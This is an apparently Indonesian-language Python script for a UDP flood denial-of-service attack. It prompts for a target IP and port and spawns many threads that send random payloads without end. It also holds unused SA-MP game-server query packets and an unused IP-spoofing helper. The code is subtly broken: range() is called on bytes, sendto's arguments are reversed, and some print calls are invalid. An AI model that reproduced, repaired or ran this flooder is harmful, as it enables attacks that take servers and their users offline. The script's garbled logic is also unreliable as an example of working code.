import random
import socket
import time
import threading
import os,sys
import codecs
import struct

Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),##7777
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),##tandem
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),##7778
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),#7771
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]
os.system('clear')
print("\033[91m")
print("""
Vip 約束
""")
ip = str(input("Ip Host: "))
port = int(input("Port Host: "))
times = int(input("Packets: "))
threads = int(input("Threads: "))
os.system('clear')
print("DOR ATTACK? TUNGGU 5 DEIK")
time.sleep(5)
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled
#udp
def exp():
  data = random._urandom(1240)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(data):
        s.sendto(addr,data)
        print(+"\033[0;37;40m VIP MENYENGGOL IP %s \033[33mPORT %s"%(ip,port))
    except:
      print("\033[0;37;40m VIP MENYENGGOL IP %s PORT %s"%(ip,port))
#udp
def exp3():
  data = random._urandom(1240)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(data):
        s.sendto(addr,data)
        print(+"\033[0;37;40m VIP MENYENGGOL IP %s \033[33mPORT %s"%(ip,port))
    except:
      print("\033[0;37;40m VIP MENYENGGOL IP %s PORT %s"%(ip,port))

#udp
def exp2():
  data = random._urandom(818)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(data):
        s.sendto(addr,data)
        print(+"\033[0;37;40m VIP MENYENGGOL IP %s \033[33mPORT %s"%(ip,port))
    except:
      print("\033[0;37;40m VIP MENYENGGOL IP %s PORT %s"%(ip,port))

#udp
def exp8():
  data = random._urandom(811)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(data):
        s.sendto(addr,data)
        print(+"\033[0;37;40m VIP MENYENGGOL IP %s \033[33mPORT %s"%(ip,port))
    except:
      print("\033[0;37;40m VIP MENYENGGOL IP %s PORT %s"%(ip,port))

#udp
def exp9():
  data = random._urandom(700)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(data):
        s.sendto(addr,data)
        print(+"\033[0;37;40m VIP MENYENGGOL IP %s \033[33mPORT %s"%(ip,port))
    except:
      print("\033[0;37;40m VIP MENYENGGOL IP %s PORT %s"%(ip,port))

for y in range(threads):
  th = threading.Thread(target = exp)
  th.start()
  th = threading.Thread(target = exp3)
  th.start()
  th = threading.Thread(target = exp2)
  th.start()
  th = threading.Thread(target = exp8)
  th.start()
  th = threading.Thread(target = exp9)
  th.start()
##///////////////////////////////////////##
##/////////////AUTHOR: VIP///////////##
##/////////////RENAME? PM GUA////////////##
##///////////////////////////////////////##
